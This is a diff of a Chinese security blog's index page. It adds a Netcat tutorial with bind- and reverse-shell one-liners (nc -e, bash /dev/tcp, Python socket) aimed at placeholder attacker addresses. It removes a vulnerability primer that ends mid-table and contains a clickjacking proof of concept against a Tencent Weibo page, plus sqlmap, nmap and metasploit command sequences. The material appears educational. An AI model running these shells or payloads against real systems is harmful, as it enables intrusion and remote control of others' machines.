@@ -59,6 +59,79 @@
 
   
     
+    <h3 class="article-title"><a href="/2018/12/03/Netcat-工具使用/"><span>Netcat 工具使用</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/12/03/Netcat-工具使用/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-12-03T15:06:06.000Z">
+          2018-12-03
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h4 id="Netcat的工具使用总结："><a href="#Netcat的工具使用总结：" class="headerlink" title="Netcat的工具使用总结："></a>Netcat的工具使用总结：</h4><p>一，Netcat Banner获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port]</span><br></pre></td></tr></table></figure>
+<p>二，文件传输</p>
+<p>例如我们想在目标主机上执行远程命令，所以需要将文件从攻击主机传输到目标主机。首先，设置一个侦听器，并从攻击主机连接到它。使用端口8888用于此目的，将该文件安全保存到桌面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888 &gt; 文件路径</span><br></pre></td></tr></table></figure>
+<p>在攻击机上，我们连接到该8888端口并发送文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] &lt; 文件路径</span><br></pre></td></tr></table></figure>
+<p>三，Bind Shells &amp;Reverse Shells</p>
+<p>在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。</p>
+<p>Reverse Shell:</p>
+<p>1.设置一个Netcat侦听器，（我们侦听端口8888）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
+<p>2.接下来我们在目标主机上执行下面的命令来连接我们的攻击主机（记住我们在这个攻击主机上执行了远程代码）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] -e /bin/bash    &lt;for linux&gt;</span><br><span class="line">nc.exe [ip-address] [port] -e cmd.exe  &lt;for windows&gt;</span><br></pre></td></tr></table></figure>
+<p>若目标主机没有Netcat，我们使用其他方法来代替</p>
+<p>Bash反向shell，使用Bash通过使用以下命令从目标主机启动反向shell连接攻击主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &amp;/dev/tcp/[ip-address]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>python反向shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c’import socket，subprocess，os; s = socket.socket(socket.AF_INET，socket.SOCK_STREAM); s.connect((“[ip-address]”，[port])); os.dup2（s.fileno()，0); os.dup2(s.fileno()，1); os.dup2(s.fileno()，2); P = subprocess.call([“/ bin / sh”，” - i”]);”</span><br></pre></td></tr></table></figure>
+<p>Bind Shell:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Attacker:nc [ip-address] [port]</span><br><span class="line">Target:  nc -lvp [port] -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Tools/">Tools</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2018/11/01/路由器漏洞挖掘入门/"><span>路由器漏洞挖掘入门</span></a></h3>
     
   
@@ -923,88 +996,6 @@
     <span class="post-tags">
       <i class="icon-tags"></i>
         <a href="/tags/浏览器安全/">浏览器安全</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/04/25/一些漏洞整理/"><span>一些漏洞整理</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/04/25/一些漏洞整理/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-04-25T11:41:41.000Z">
-          2018-04-25
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <hr>
-<p>一些漏洞的基础原理+安全基础知识整理（之前就想发来着，但是一直完完善善到现在）</p>
-<p>sql注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SQL注入:是一种通过操纵输入来修改后台sql语句已达到利用代码进行攻击的技术。</span><br><span class="line">为什么会产生SQL注入：程序在开发过程中不注意规范书写sql语句和对字符进行过滤，导致可以通过全局变量post/get提交一些sql语句。</span><br><span class="line">如何防御：a:限制用户的操作权限；b:检查限制变量类型； c：对特殊字符进行过滤/转义 d:使用参数化语句(sqlParameter类库中的规则，绝对不会让用户的输入拼接成sql语句改变其原来意义)</span><br><span class="line">基于程度和顺序的注入(哪里发生了影响)</span><br><span class="line">- 一阶注射</span><br><span class="line">- 二阶注射</span><br><span class="line">一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.</span><br><span class="line">基于注入点的位置上的 </span><br><span class="line">- - 通过用户输入的表单域的注射。</span><br><span class="line">  - 通过cookie注射。</span><br><span class="line">  - 通过服务器变量注射。 （基于头部信息的注射）</span><br></pre></td></tr></table></figure>
-<p>xss攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xss:当应用程序收到含有不可信的数据时，在没有进行验证与转义的情况下，就将它发送给一个网页浏览器，这样就会产生跨站脚本攻击。</span><br><span class="line">为什么会有xss:网页中被嵌入了javascript代码，当用户点击网页时script代码就会被执行，进而进行脚本攻击。</span><br><span class="line">防御：a:验证数据类型；(htmlSpecialChars()防止解析浏览器html元素)</span><br><span class="line">                    (addslashes()双引号前加反斜杠)</span><br><span class="line">     b:输入输出安全检查</span><br><span class="line">分类: 存储型(发到站上)</span><br><span class="line">      反射型(构造一些url)</span><br><span class="line">      DOM型</span><br></pre></td></tr></table></figure>
-<p>csrf攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">csrf:csrf说白了就是盗用用户的身份.</span><br><span class="line"> 防御：A:验证 HTTP Referer 字段；</span><br><span class="line">        在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。</span><br><span class="line">        这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。</span><br><span class="line">        即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。</span><br><span class="line">        </span><br><span class="line">      B:在请求地址中添加 token 并验证；</span><br><span class="line">        CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</span><br><span class="line"></span><br><span class="line">        这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对.</span><br><span class="line">        该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。</span><br><span class="line"></span><br><span class="line">      C:在 HTTP 头中自定义属性并验证;</span><br><span class="line">        这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</span><br><span class="line"></span><br><span class="line">       然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</span><br></pre></td></tr></table></figure>
-<p>ssrf攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssrf:如果应用程序对用户提供的url和远端服务器返回的信息没有进行合适验证和过滤，就可能存在这种服务器端请求伪造的缺陷。</span><br><span class="line">攻击：   a.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</span><br><span class="line">        b.攻击运行在内网或本地的应用程序（比如溢出）;</span><br><span class="line">        c.对内网web应用进行指纹识别，通过访问默认文件实现;</span><br><span class="line">        d.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</span><br><span class="line">        e.利用file协议读取本地文件等。</span><br><span class="line">防御：   a:过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span><br><span class="line">         b: 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br><span class="line">         c:限制请求的端口为http常用的端口，比如，80,443,8080,8090。</span><br><span class="line">         d:黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</span><br><span class="line">         e:禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</span><br></pre></td></tr></table></figure>
-<p>文件上传漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件上传漏洞：通常是由于网页代码中的上传路径变量过滤不严造成的。如果文件上传功能实现代码没有严格用户上传的文件后缀及文件类型，攻击者可通过web访问访问的目录上传任意代码，包括webshell，进而远程控制网络服务器。</span><br><span class="line">防御：严格限制校验上传文件，禁止上传恶意代码的条件。</span><br></pre></td></tr></table></figure>
-<p>xxe外部实体注入漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XXE：在应用程序解析xml输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成a:文件读取b:命令执行c:内网端口扫描d:攻击内网网站e:发起DDos攻击等</span><br><span class="line">XXE漏洞检测：1）：检测xml是否被成功解析</span><br><span class="line">                &lt;!DOCTYPE ANY[</span><br><span class="line">                 &lt;!ENTITY name &quot;my name is xxx&quot;&gt;</span><br><span class="line">                 ]&gt;</span><br><span class="line">            2）：检测服务器是否支持DTD引用外部实体</span><br><span class="line">                 &lt;!ENTITY % name system &quot;http://localhost/index.html&quot;&gt;</span><br><span class="line">                 然后查看服务器上的日志判断，查看目标服务器向你的服务器发了一条xml请求。</span><br><span class="line">防御：a：使用开发者提供的禁用外部实体的方法</span><br><span class="line">         from xml import etree</span><br><span class="line">         xmlData=etree parse()</span><br><span class="line">     b:过滤关键词&lt;!ENTITY, system ,public</span><br></pre></td></tr></table></figure>
-<p>中间人攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    假设爱丽丝（Alice）希望与鲍伯（Bob）通信。同时，马洛里（Mallory）希望拦截窃会话以进行窃听并可能在某些时候传送给鲍伯一个虚假的消息。</span><br><span class="line">    首先，爱丽丝会向鲍勃索取他的公钥。如果Bob将他的公钥发送给Alice，并且此时马洛里能够拦截到这个公钥，就可以实施中间人攻击。马洛里发送给爱丽丝一个伪造的消息，声称自己是鲍伯，并且附上了马洛里自己的公钥（而不是鲍伯的）。</span><br><span class="line">    爱丽丝收到公钥后相信这个公钥是鲍伯的，于是爱丽丝将她的消息用马洛里的公钥（爱丽丝以为是鲍伯的）加密，并将加密后的消息回给鲍伯。马洛里再次截获爱丽丝回给鲍伯的消息，并使用马洛里自己的私钥对消息进行解密，如果马洛里愿意，她也可以对消息进行修改，然后马洛里使用鲍伯原先发给爱丽丝的公钥对消息再次加密。当鲍伯收到新加密后的消息时，他会相信这是从爱丽丝那里发来的消息。</span><br><span class="line">防御：许多抵御中间人攻击的技术基于以下认证技术：</span><br><span class="line">     公钥基础建设</span><br><span class="line">在PKI方案中，主要防御中间人攻击的方案就是PKI的相互认证的机制。使用这样的机制并由应用程序验证用户，用户设备验证应用程序。但在某些流氓应用的情况下，这不是很有用，所以需要注意对流氓软件应与正规软件进行区分。</span><br><span class="line">更强力的相互认证，例如：</span><br><span class="line">     密钥（通常是高信息熵的密钥，从而更安全），或密码（通常是低的信息熵的密钥，从而降低安全性）</span><br><span class="line">延迟测试，例如使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</span><br><span class="line">     第二（安全的）通道的校验</span><br><span class="line">一次性密码本可以对中间人攻击免疫，这是在对一次密码本的安全性和信任上创建的。公钥体系的完整性通常必须以某种方式得到保障，但不需要进行保密。密码和共享密钥有额外的保密需求。公钥可以由证书颁发机构验证，这些公钥通过安全的渠道（例如，随Web浏览器或操作系统安装）分发。公共密钥也可以经由Web在线信任进行在线验证，可以通过安全的途径分发公钥（例如，通过面对面的途径分发公钥）。</span><br><span class="line">查看密钥交换协议以了解不同类别的使用不同密钥形式或密码以抵御中间人攻击的协议。</span><br></pre></td></tr></table></figure>
-<p>点击劫持</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">原理：点击劫持（clickjacking）是一种在网页中将恶意代码等隐藏在看似无害的内容（如按钮）之下，并诱使用户点击的手段。举例来说，如用户收到一封包含一段视频的电子邮件，但其中的“播放”按钮并不会真正播放视频，而是链入一购物网站。这样当用户试图“播放视频”时，实际是被诱骗而进入了一个购物网站。</span><br><span class="line">     大概有两种方式，一是攻击者使用一个透明的iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的iframe页面；二是攻击者使用一张图片覆盖在网页，遮挡网页原有位置的含义；</span><br><span class="line">     点击劫持常见防御方法的绕过：</span><br><span class="line">JS防御 </span><br><span class="line">如if (top.location != self.location) &#123;top.location=self.location;&#125; </span><br><span class="line">&lt;iframe src=&quot;xxx&quot; security=&quot;restricted&quot; scrolling=&quot;no&quot; sandbox=&quot;&quot;&gt; </span><br><span class="line">security=&quot;restricted&quot;  为IE的禁止JS</span><br><span class="line">sandbox=&quot;&quot;  为HTML5的禁止JS</span><br><span class="line">这样就达到了bypass的效果，但有时候我们想劫持的按钮也是js的 那样就比较蛋疼了，但可以参考下面的方法。</span><br><span class="line">其他方法跳转进行防御</span><br><span class="line">只要是强制跳转到目标站的防御方法，都可以用此方法绕过。</span><br><span class="line">制作双重iframe，即最底层为目标站，二层为透明，这样还是能达到我们想要的效果。</span><br><span class="line">让点击劫持更猥琐的搭配:</span><br><span class="line">搭配输入框</span><br><span class="line">以前曾发现加拿大某银行可以进行点击劫持，但需要用户输入转账的银行卡号和银行，那么我们就可以放几个框，并诱惑用户在框里输入我的银行卡号和银行，这样用户看起来输入到我们的框里，实际上输入到了银行转账的页面当中。</span><br><span class="line">防御：X-FRAME-OPTIONS是目前最可靠的方法。X-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击。并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。这个头有三个值：</span><br><span class="line">DENY // 拒绝任何域加载</span><br><span class="line">SAMEORIGIN // 允许同源域下加载</span><br><span class="line">ALLOW-FROM // 可以定义允许frame加载的页面地址</span><br><span class="line">php中设置：</span><br><span class="line">header(&quot;X-FRAME-OPTIONS:DENY&quot;);</span><br><span class="line"></span><br><span class="line">实例：腾讯微博刷粉</span><br><span class="line">poc:&lt;code&gt;&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;title&gt;点击劫持 POC&lt;/title&gt;</span><br><span class="line"> &lt;style&gt; iframe &#123; width: 1440px; height: 900px; position: absolute; top: -0px; left: -0px; z-index: 2; -moz-opacity: 0; opacity: 0; filter: alpha(opacity=0); &#125; </span><br><span class="line">button &#123; position: absolute; top: 250px; left: 770px; z-index: 1; width: 80px; height:20px; &#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;button&gt;点击脱衣&lt;/button&gt; </span><br><span class="line">&lt;img src=&quot;http://b.hiphotos.baidu.com/image/pic/item/3ac79f3df8dcd1001341dbcd768b4710b8122f78.jpg&quot;&gt; &lt;iframe src=&quot;http://search.t.qq.com/user.php?pos=436&amp;k=东北保钓&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;/code&gt;</span><br></pre></td></tr></table></figure>
-<p>一些安全工具的使用(sqlmap，Nmap，metasploit，Tcpdump，wireshark，burpsuite，awvs)？</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sqlmap: </span><br><span class="line">~ sqlmap -u url </span><br><span class="line">~ sqlmap -u url   --dbs //暴库</span><br><span class="line">~ sqlmap -u url   --current - db  //web当前所使用的数据库</span><br><span class="line">~ sqlmap -u url   --users  //列出数据库所有的用户</span><br><span class="line">tcpDump:</span><br><span class="line">~ tcpdump -i eth0 -s 0 -w file.pcap</span><br><span class="line">~ tcpdump -A -r a.cap //以ASCII格式打印出所有的分组并且读取此文件</span><br><span class="line">~ tcpdump -i eth0 port 22</span><br><span class="line">~ tcpdump -i eth0 tcp port 22 //只抓TCP，22端口的包，这里我们用nc来连一下另一台虚拟机的22端口</span><br><span class="line">~ tcpdump -i eth1 host 192.168.1.123 and port 80 -w /tmp/xxx.cap // 抓192.168.1.123的80端口的包 </span><br><span class="line">~ tcpdump -i eth1 host 192.168.1.123 and icmp -w /tmp/xxx.cap //抓192.168.1.123的icmp的包 </span><br><span class="line">~ tcpdump -i eth1 port 80 and vlan 1 -w /tmp/xxx.cap //抓vlan 1的包 </span><br><span class="line">~ tcpdump -i eth1 pppoes -w /tmp/xxx.cap //抓pppoe的密码 </span><br><span class="line">Nmap:</span><br><span class="line">~ nmap -sP target-ip //检测存活主机</span><br><span class="line">~ nmap -sT target-ip //检测端口开放情况</span><br><span class="line">~ nmap -sS -o target-ip //操作系统识别</span><br><span class="line">~ nmap -sT -p 80 -oG -ip |grep open //列出开放指定端口的主机列表</span><br><span class="line">~ nmap -sV -p 80 thief-one //列出服务器类型</span><br><span class="line">metasploit+Nmap:</span><br><span class="line">~ nmap -sT -A --script=smb-check -vulns -po target-ip //扫描</span><br><span class="line">~ msfconsole</span><br><span class="line">~ show auxiliary</span><br><span class="line">~ show option</span><br><span class="line">~ search ms07-010</span><br><span class="line">~ search exploits</span><br><span class="line">~ use window/smb/ms07-010-netapi</span><br><span class="line">~ show targets</span><br><span class="line">~ show payloads</span><br><span class="line">~ use payload +载荷revese_tcp</span><br><span class="line">~ show option</span><br><span class="line">~ set  Rhost target-ip</span><br><span class="line">~ set Lhost 自己的ip</span><br><span class="line">~ set Lport 8080</span><br></pre></td></tr></table></figure>
-<p>网络知识</p>
-<p>http知识：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">http:</span><br><span class="line">http的请求报文：http的版本号，http方法(get,post,HEAD....),url,请求头(被请求的文件类型)，实体头</span><br><span class="line">HTTP的响应报文：http版本号，状态码，响应头，实体头，内容</span><br><span class="line">HTTP的作用：1）：确认通讯双方的身份 2）：建立安全通道，保证数据安全传输</span><br><span class="line">get，post，head的区别？</span><br><span class="line">答： 如果请求表单，新闻组，BBS，邮件组数和数据库字段&quot;索引&quot;就用post替换get，表示请求的是一个较大的数据。head只请求web页面的信息，不返回信息体，用于验证该web页面。get请求web页面的信息。</span><br><span class="line">HTTP的状态码</span><br><span class="line">  下面是常见的HTTP状态码：</span><br><span class="line">200 - 请求成功</span><br><span class="line">301 - 资源（网页等）被永久转移到其它URL</span><br><span class="line">404 - 请求的资源（网页等）不存在</span><br><span class="line">500 - 内部服务器错误</span><br><span class="line">HTTP状态码分类</span><br><span class="line">HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：</span><br><span class="line">HTTP状态码分类</span><br><span class="line">分类	分类描述</span><br><span class="line">1**	信息，服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2**	成功，操作被成功接收并处理</span><br><span class="line">3**	重定向，需要进一步的操作以完成请求</span><br><span class="line">4**	客户端错误，请求包含语法错误或无法完成请求</span><br><span class="line">5**	服务器错误，服务器在处理请求的过程中发生了错误</span><br><span class="line">HTTP状态码列表:</span><br><span class="line">HTTP状态码列表</span><br><span class="line">状态码	状态码英文名称	中文描述</span><br><span class="line">100	Continue	继续。客户端应继续其请求</span><br><span class="line">101	Switching Protocols	切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</span><br><span class="line">200	OK	请求成功。一般用于GET与POST请求</span><br><span class="line">201	Created	已创建。成功请求并创建了新的资源</span><br><span class="line">202	Accepted	已接受。已经接受请求，但未处理完成</span><br><span class="line">203	Non-Authoritative Information	非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</span><br><span class="line">204	No Content	无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</span><br><span class="line">205	Reset Content	重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</span><br><span class="line">206	Partial Content	部分内容。服务器成功处理了部分GET请求</span><br><span class="line">300	Multiple Choices	多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</span><br><span class="line">301	Moved Permanently	永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</span><br><span class="line">302	Found	临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</span><br><span class="line">303	See Other	查看其它地址。与301类似。使用GET和POST请求查看</span><br><span class="line">304	Not Modified	未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</span><br><span class="line">305	Use Proxy	使用代理。所请求的资源必须通过代理访问</span><br><span class="line">306	Unused	已经被废弃的HTTP状态码</span><br><span class="line">307	Temporary Redirect	临时重定向。与302类似。使用GET请求重定向</span><br><span class="line">400	Bad Request	客户端请求的语法错误，服务器无法理解</span><br><span class="line">401	Unauthorized	请求要求用户的身份认证</span><br><span class="line">402	Payment Required	保留，将来使用</span><br><span class="line">403	Forbidden	服务器理解请求客户端的请求，但是拒绝执行此请求</span><br><span class="line">404	Not Found	服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置&quot;您所请求的资源无法找到&quot;的个性页面</span><br><span class="line">405	Method Not Allowed	客户端请求中的方法被禁止</span><br><span class="line">406	Not Acceptable	服务器无法根据客户端请求的内容特性完成请求</span><br><span class="line">407	Proxy Authentication Required	